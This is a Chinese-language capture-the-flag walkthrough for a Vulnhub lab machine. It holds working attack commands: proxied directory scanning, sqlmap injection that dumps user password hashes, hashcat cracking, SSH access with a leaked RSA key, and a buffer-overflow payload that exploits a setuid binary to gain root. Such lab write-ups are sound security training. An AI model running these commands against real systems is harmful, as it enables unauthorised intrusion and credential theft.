项目二十六用Vulnhub搭建好选择wifi做桥接，自动显示IP！

1、nmap 192.168.4.175 -p-

8080/tcp  open  http-proxy
31337/tcp open  Elite
64666/tcp open  unknown    ---ssh

2、web信息收集

访问：http://192.168.4.175:8080/

访问8080，返回403错误!
1）要么是WAF（Web应用程序防火墙）阻止了
2）要么是服务器配置完全拒绝了访问


3、代理web信息收集

FoxyProxy挂载代理：192.168.4.175  31337
访问：http://127.0.0.1:8080/   ---正常访问进入

dirb http://127.0.0.1:8080 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -p 192.168.4.175:31337 

-------
-a 设置ua
-c 设置cookie带cookie扫描
-N 忽略某些响应码
-o 输出结果
-p 使用代理
-X 在每个测试目录上附加后缀
-z 设置毫秒延迟 
-------
发现/littlesecrets-main目录


http://127.0.0.1:8080/littlesecrets-main
访问发现这是个登录页面！


dirb http://127.0.0.1:8080/littlesecrets-main /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -p 192.168.4.175:31337 -X .php
http://127.0.0.1:8080/littlesecrets-main/logs.php
http://127.0.0.1:8080/littlesecrets-main/login.php

访问：http://127.0.0.1:8080/littlesecrets-main/logs.php
显示Web服务器将每次登录尝试存储在数据库中的提示信息！




4、sql注入测试

sqlmap可以在主机上执行5个登级测试，默认为1级：

级别1：测试GET和POST参数。
级别2：测试HTTP Cookie标头值。
第3级：测试HTTP User Agent/Referer标头值！


sqlmap   wiki：
https://github.com/sqlmapproject/sqlmap/wiki/Usage

http://127.0.0.1:8080/littlesecrets-main/
http://127.0.0.1:8080/littlesecrets-main/login.php

sqlmap --url http://127.0.0.1:8080/littlesecrets-main/login.php --level=3 --proxy http://192.168.4.175:31337 --data="user=admin&pass=admin" --dump

--proxy：走代理
--dump：导出列里面的字段

成功跑出payload，并获得数值！

1）查看mysql的表值
sqlmap -o -u http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.4.175:31337 --data="user=user&pass=pass&submit=Login" --level=5 --risk=3 --dbms=mysql --tables

+---------------------------------------+
| logs                                  |
| users                                 |
+---------------------------------------+

2）爆破字段内容

sqlmap -u http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.4.175:31337 --data="user=user&pass=pass&submit=Login" --level=5 --risk=3 --dbms=mysql --dump users

或者BP抓包：
sqlmap --proxy="http://192.168.4.175:31337" -r 1.txt --level 3 --batch
payload存在！

sqlmap --proxy="http://192.168.4.175:31337" -r 1.txt --level 3 --dbs
[*] information_schema
[*] pinky_sec_db

sqlmap --proxy="http://192.168.4.175:31337" -r 1.txt --level 3 -D pinky_sec_db --tables
+-------+
| logs  |
| users |
+-------+

sqlmap --proxy="http://192.168.4.175:31337" -r 1.txt --level 3 --batch -D pinky_sec_db -T users -C user,pass --dump

+-------------+----------------------------------+
| user        | pass                             |
+-------------+----------------------------------+
| pinkymanage | d60dffed7cc0d87e1f4a11aa06ca73af |
| pinky       | f543dbfeaf238729831a321c7a68bee4 |
+-------------+----------------------------------+

发现：
pinkymanage:d60dffed7cc0d87e1f4a11aa06ca73af


https://www.somd5.com/   ---在线解密
或者：john --format=raw-md5 --show hash.txt


或者：hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt
d60dffed7cc0d87e1f4a11aa06ca73af:3pinkysaf33pinkysaf3

pinkymanage
3pinkysaf33pinkysaf3


5、内网信息收集

ssh登录：
ssh pinkymanage@192.168.4.175 -p64666
3pinkysaf33pinkysaf3


1）Linux version 4.9.0-4-amd64
2）Sudo version 1.8.19p1
3）127.0.0.1:3306
4）用户枚举：
pinkymanage:x:1001:1001:pinkymanage,,,:/home/pinkymanage:/bin/bash
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
5）_ grep note.txt  ---存在文本信息

find / -name note.txt 2>/dev/null
cat /var/www/html/littlesecrets-main/ultrasecretadminf1l35/note.txt
Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..

cd /var/www/html/littlesecrets-main/ultrasecretadminf1l35/
ls -la
cat .ultrasecret
发现rsa密匙信息，复制到本地hash文件中，进行base64转码！
cat hash | base64 -d
在将编码后的值复制到hash1
chmod 400 hash1   ---赋权

ssh -i hash1 pinky@192.168.4.175 -p 64666
成功登录！！



6、提权

cat note.txt 
Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(

进入pinky用户后在本地目录看到：ls -la
-rwsr-xr-x 1 root  root  8880 Feb  2  2018 adminhelper

这是一个二进制可编译执行程序，估计存在缓冲区溢出测试！

file adminhelper
setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)
这是一个64位的缓冲区溢出！


1）模糊测试

./adminhelper dayu
dayu
可发现值可以输入数值的，python打印：
./adminhelper $(python -c "print 'A'*100")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
回显崩溃了！！存在缓冲区溢出！

2）深入探测了解strings

strings adminhelper
其代码中使用了strcpy函数!

或者：disas main   ---查看main函数
查看main函数，发现程序使用了strcpy函数，看来是个缓冲区溢出的问题，也同时发现了spawn函数！！

3）深入探测了解函数
gdb adminhelper
info functions
0x0000000000000640  strcpy@plt
0x00000000000007d0  spawn
----------
info functions ：列出可执行文件的所有函数名称，在内存中的symbol table查找，结果中的地址是内存里的地址，所以得到结果后，直接b（break，添加断点）这个地址，即可正确加断点。
jump：当调试程序时，你可能不小心走过了出错的地方，可jump回去
break : 给程序设置断点
i b : 查看断点
delect编号 ： 删除断点
disas $pc：反汇编当前函数
spawn()   ---则会创建一个新的进程来执行,生成一个子进程。返回代码将表明的状态创建进程。
----------


4）查看ASLR设置：
cat /proc/sys/kernel/randomize_va_space
0
未开启！

5）找溢出值（偏移量）
./adminhelper $(python -c "print 'A'*72")
Bus error

发现偏移量：72
-----------
或者使用：gdb-peda模块
gdb ./adminhelper
pattern_create 100 buf
r $(cat buf)    ---0000| 0x7fffffffde98 ("IAAeAA4A")
pattern_offset "IAAeAA4AAJAAfAA5AAKAAgAA6AAL"
IAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 72


6）填充测试溢出覆盖
gdb ./adminhelper
run $(python -c "print 'A'*72 + 'B'*6")
info r

rbp            0x4141414141414141
rip            0x424242424242
rsp            0x7fffffffe550


7）查找跳板函数
gdb ./adminhelper
info functions    ---gdb进入调试程序后，查看函数
0x00000000000007d0  spawn
发现spawn函数（这边可以利用spawn函数进行提权）


8）模糊测试spanwn是否能提权

逻辑思路：
gdb调试程序->main下断点->执行后jump回spawn函数->最终判断
---------------------
gdb adminhelper
(gdb) break main    ----下断点main处
Breakpoint 1 at 0x817
(gdb) run    ----运行
Starting program: /home/pinky/adminhelper 

Breakpoint 1, 0x0000555555554817 in main ()
(gdb) jump spawn     ----查看寄存器
Continuing at 0x5555555547d4.
process 6970 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$    ------可看到获得了shell！！
---------------------


9）查看spawn到达的地址rbp

gdb ./adminhelper
run $(python -c "print 'A'*72 + 'B'*6")
disas spawn
0x00005555555547d0 <+0>:	push   %rbp

看到目标内存地址是0x00005555555547d0，创建shell需要注入到5555555547d0，以避免在shellcode中有空字节，在shellcode中，字节顺序相反，所以：
\xd0\x47\x55\x55\x55\x55


10）exp执行

./adminhelper $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
成功获得root权限！


------------------------
知识拓展：

第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也只能使用前47位要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分！

详细知识：
1）被扩展到64位的通用寄存器为：RAX，RBX，RCX，RDX，RSI和RDI
2）被扩展为64位的指令指针,基地址指针,栈指针分别为RIP，RBP和RSP
3）提供的额外寄存器:R8到R15
4）8字节宽的指针
5）在栈上push/pop为8字节宽
6）地址最大的标准大小为0x00007FFFFFFFFFFF
7）通过寄存器传递函数的参数


ESP、EIP、EBP


























